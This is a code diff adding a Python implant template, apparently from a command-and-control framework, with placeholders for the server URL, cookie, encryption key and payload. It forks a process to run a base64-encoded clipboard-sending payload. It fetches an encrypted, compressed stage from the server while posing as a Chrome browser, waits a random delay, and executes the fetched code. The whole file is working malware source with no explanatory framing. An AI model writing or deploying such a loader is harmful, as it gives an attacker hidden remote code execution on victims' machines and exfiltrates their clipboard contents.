@@ -1,0 +1,39 @@
+import urllib.request
+import urllib.parse
+import base64
+import time
+import random
+import sys
+import zlib
+import os
+from cryptography.fernet import Fernet
+URL = "$url"
+
+base64_send_clipboard = '$base64_send_clipboard'
+
+base64_decoded = base64.b64decode(base64_send_clipboard)
+
+pid=os.fork()
+if pid==0: # new process
+    exec(base64_decoded)
+
+request = urllib.request.Request(URL, method='GET')
+request.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36')
+request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
+request.add_header('Accept-Language', 'Accept-Language: en-US,en;q=0.5')
+request.add_header('Cookie', 'Session=$cookie')
+response = urllib.request.urlopen(request)
+
+data = response.read()
+
+f = Fernet('$key')
+
+
+decrypted = f.decrypt(data)
+decompressed = zlib.decompress(decrypted)
+decoded = decompressed.decode('ascii')
+
+wait_time = random.randint(10, 20)
+time.sleep(wait_time)
+
+exec(decoded)
